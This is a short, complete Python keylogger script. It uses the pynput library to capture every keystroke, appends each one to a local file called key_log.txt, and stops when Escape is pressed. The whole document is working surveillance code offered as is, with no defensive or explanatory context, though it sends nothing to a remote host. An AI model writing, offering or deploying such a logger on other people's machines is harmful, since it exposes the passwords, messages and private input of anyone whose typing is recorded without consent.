from pynput.keyboard import Key, Listener

# File to save logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        # Record the key pressed
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    # Stop keylogger when Escape is pressed
    if key == Key.esc:
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
